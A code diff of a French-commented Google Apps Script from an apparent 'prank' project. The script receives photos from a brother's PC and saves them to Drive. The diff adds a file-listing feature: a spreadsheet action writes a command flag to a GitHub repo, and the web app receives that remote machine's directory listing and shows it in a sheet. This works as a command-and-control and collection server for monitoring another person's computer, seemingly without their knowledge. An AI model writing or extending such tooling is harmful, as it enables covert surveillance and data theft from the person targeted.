@@ -16,13 +16,14 @@
 //    et assigner les fonctions ci-dessous
 // ================================================================
 
-const FOLDER_ID  = 'REMPLACER_PAR_ID_DOSSIER_DRIVE';
-const OWNER      = 'thesangu';
-const REPO       = 'Aventuuuure';
-const BRANCH     = 'main';
-const LOCK_PATH  = 'data/blague_lock.json';
-const PHOTO_PATH = 'data/blague_photo.json';
-const JOURS_MAX  = 30;
+const FOLDER_ID    = 'REMPLACER_PAR_ID_DOSSIER_DRIVE';
+const OWNER        = 'thesangu';
+const REPO         = 'Aventuuuure';
+const BRANCH       = 'main';
+const LOCK_PATH    = 'data/blague_lock.json';
+const PHOTO_PATH   = 'data/blague_photo.json';
+const LISTING_PATH = 'data/blague_listing.json';
+const JOURS_MAX    = 30;
 
 function _token() {
   return PropertiesService.getScriptProperties().getProperty('GITHUB_TOKEN');
@@ -101,15 +102,50 @@ function nettoyerPhotos() {
   }
 }
 
-// ── WEB APP : recoit les photos du PC du frere ───────────────────
+// ── LISTING FICHIERS ─────────────────────────────────────────────
+
+function demanderListing() {
+  const f = _githubGet(LISTING_PATH);
+  _githubPut(LISTING_PATH, { list_files: true }, f.sha);
+  SpreadsheetApp.getUi().alert('📁 Demande envoyée ! La liste arrive dans quelques secondes dans l\'onglet "Fichiers".');
+}
+
+function _afficherListing(data) {
+  const ss     = SpreadsheetApp.getActiveSpreadsheet();
+  let sheet    = ss.getSheetByName('📁 Fichiers');
+  if (sheet) sheet.clear();
+  else sheet   = ss.insertSheet('📁 Fichiers');
+
+  sheet.appendRow(['📁 Listing de ' + data.machine + ' — ' + data.date]);
+  sheet.appendRow(['Dossier racine', 'Chemin', 'Taille (ko)', 'Modifié', 'Type']);
+  sheet.getRange(2, 1, 1, 5).setFontWeight('bold').setBackground('#e8f0fe');
+
+  const rows = data.fichiers.map(f => [
+    f.dossier, f.chemin, f.taille_ko || '', f.modifie, f.est_dossier ? '📁' : '📄'
+  ]);
+  if (rows.length > 0) sheet.getRange(3, 1, rows.length, 5).setValues(rows);
+
+  sheet.autoResizeColumns(1, 5);
+  ss.setActiveSheet(sheet);
+}
+
+// ── WEB APP : recoit photos ET listing du PC du frere ────────────
 
 function doPost(e) {
   try {
-    const data  = JSON.parse(e.postData.contents);
+    const data = JSON.parse(e.postData.contents);
+
+    if (data.type === 'listing') {
+      _afficherListing(data);
+      return ContentService.createTextOutput('ok');
+    }
+
+    // Photo
     const bytes = Utilities.base64Decode(data.image);
     const blob  = Utilities.newBlob(bytes, 'image/jpeg', data.filename);
     DriveApp.getFolderById(FOLDER_ID).createFile(blob);
     return ContentService.createTextOutput('ok');
+
   } catch (err) {
     return ContentService.createTextOutput('error: ' + err.message);
   }
